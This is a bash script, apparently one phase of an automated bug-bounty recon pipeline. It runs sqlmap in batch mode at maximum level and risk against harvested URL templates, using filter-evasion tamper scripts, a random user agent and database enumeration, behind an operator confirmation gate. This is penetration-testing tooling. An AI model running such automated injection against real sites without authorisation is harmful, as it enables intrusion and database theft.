#!/usr/bin/env bash
# Phase 17 — SQL injection (sqlmap, gated). Intrusive — operator confirms.

PHASE="17-sqli"
. "$(dirname "$0")/_lib.sh"

require_target
OUTDIR=$(out_dir "$PHASE")
GF_SQLI="$RECONFORGE_OUTPUT_DIR/$TARGET/$DATESTAMP/11-pattern-filter/gf-sqli.txt"

if [ ! -s "$GF_SQLI" ] || ! command -v sqlmap >/dev/null 2>&1; then
    log ERR "sqlmap missing or no gf sqli candidates"
    exit 4
fi

log WARN "Phase 17 is INTRUSIVE — confirm program policy before running."
if [ "${SQLI_CONFIRM:-no}" != "yes" ]; then
    log WARN "set SQLI_CONFIRM=yes to actually execute. Aborting."
    exit 0
fi

# Build a deduped templates file (replace param values with FUZZ for sqlmap -m)
TEMPLATES="$OUTDIR/templates.txt"
sed 's/=[^&]*/=FUZZ/g' "$GF_SQLI" | sort -u > "$TEMPLATES"

log INFO "sqlmap batch over $(wc -l < "$TEMPLATES") templates"
sqlmap -m "$TEMPLATES" \
    --batch --random-agent \
    --level 5 --risk 3 \
    --tamper=apostrophemask,apostrophenullencode,space2comment \
    --dbs \
    --output-dir="$OUTDIR/sqlmap-out" \
    2>/dev/null || true

log INFO "Phase 17 done — see $OUTDIR/sqlmap-out/"
